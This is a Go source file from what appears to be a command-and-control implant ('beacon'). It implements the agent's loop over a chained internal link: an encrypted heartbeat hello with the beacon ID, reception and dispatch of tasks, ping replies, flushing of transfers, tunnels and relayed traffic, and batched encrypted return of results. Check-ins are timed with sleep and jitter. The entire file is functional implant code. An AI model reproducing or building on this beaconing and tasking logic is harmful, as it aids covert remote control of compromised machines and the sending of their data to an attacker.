package core

import (
	"beacon/pkg/cascade"
	"beacon/pkg/profile"
	"beacon/pkg/utils/crypt"
	"beacon/pkg/utils/packet"
	"fmt"
	"sync"
	"time"
)

type internalFrame struct {
	cmd  uint16
	body []byte
	err  error
}

type internalFrameWriter struct {
	link cascade.Link
	mu   sync.Mutex
}

func (w *internalFrameWriter) write(cmd uint16, body []byte) error {
	w.mu.Lock()
	defer w.mu.Unlock()
	return cascade.WriteFrame(w.link, cmd, body)
}

func (a *Agent) runInternal(link cascade.Link) int {
	if a == nil || a.Ctx == nil || link == nil {
		return -1
	}

	done := make(chan struct{})
	defer close(done)
	defer link.Close()

	writer := &internalFrameWriter{link: link}
	if err := a.sendInternalHello(writer); err != nil {
		return -1
	}

	frames := make(chan internalFrame, 16)
	go readInternalFrames(link, frames, done)

	timer := time.NewTimer(internalWaitDuration())
	defer timer.Stop()

	for a.Ctx.Active() && !a.stop.Load() {
		select {
		case frame := <-frames:
			if frame.err != nil {
				return 0
			}
			if !a.handleInternalFrame(writer, frame.cmd, frame.body) {
				return 0
			}
			if !a.flushInternalQueues(writer) {
				return 0
			}
		case <-timer.C:
			if !a.flushInternalQueues(writer) {
				return 0
			}
			timer.Reset(internalWaitDuration())
		}
	}

	return 0
}

func (a *Agent) sendInternalHello(writer *internalFrameWriter) error {
	plain, err := a.buildHeartbeatPlain()
	if err != nil {
		return err
	}

	heartbeat, err := crypt.EncryptHeartbeat(profile.GlobalProfile.EncryptKey, plain)
	if err != nil {
		return err
	}

	body, err := packet.PackArray([]any{
		fmt.Sprintf("%08x", a.Ctx.BeaconID),
		packet.PackBytes(heartbeat),
	})
	if err != nil {
		return err
	}
	return writer.write(cascade.FrameHello, body)
}

func readInternalFrames(link cascade.Link, out chan<- internalFrame, done <-chan struct{}) {
	for {
		cmd, body, err := cascade.ReadFrame(link)
		select {
		case out <- internalFrame{cmd: cmd, body: body, err: err}:
		case <-done:
			return
		}
		if err != nil {
			return
		}
	}
}

func (a *Agent) handleInternalFrame(writer *internalFrameWriter, cmd uint16, body []byte) bool {
	switch cmd {
	case cascade.FrameTask:
		a.dispatchTasks(body)
	case cascade.FramePing:
		return writer.write(cascade.FramePing, body) == nil
	case cascade.FrameClose:
		return false
	default:
	}
	return true
}

func (a *Agent) flushInternalQueues(writer *internalFrameWriter) bool {
	a.flushTransfers()
	a.harvestTunnels()
	a.flushCascade()
	return a.flushOutboxInternal(writer)
}

// flushOutboxInternal 批量回传 Outbox 中的结果包（一次拼接、一次加密、一次帧发送）。
// 失败时整批回塞队列头部，下个周期重试，不丢包。
func (a *Agent) flushOutboxInternal(writer *internalFrameWriter) bool {
	list := a.Ctx.Outbox.Drain()
	if list == nil {
		return true
	}

	// 1. 拼接所有包为一个明文 buffer
	plain := make([]byte, 0, 4096)
	for cur := list; cur != nil; cur = cur.next {
		plain = append(plain, cur.packet...)
	}

	// 2. 一次加密
	encrypted, err := crypt.EncryptResult(a.Ctx.SessionKey, plain)
	if err != nil {
		a.Ctx.Outbox.PushFrontList(list)
		return false
	}

	// 3. 一次帧发送
	if err := writer.write(cascade.FrameResult, encrypted); err != nil {
		a.Ctx.Outbox.PushFrontList(list)
		return false
	}
	return true
}

func internalWaitDuration() time.Duration {
	sleepFor := profile.GlobalProfile.SleepTime
	if sleepFor <= 0 {
		sleepFor = time.Second
	}

	jitter := profile.GlobalProfile.Jitter
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 100 {
		jitter = 100
	}
	if jitter > 0 {
		r := int(randomU32() % uint32(jitter+1))
		sleepFor += time.Duration((int64(r) * int64(sleepFor)) / 100)
	}
	return sleepFor
}

func (a *Agent) shouldRunInternal() bool {
	return a != nil && a.Ctx != nil && a.Ctx.Active() && !a.stop.Load()
}

func (a *Agent) internalReconnectDelay() {
	if a.shouldRunInternal() {
		time.Sleep(time.Second)
	}
}
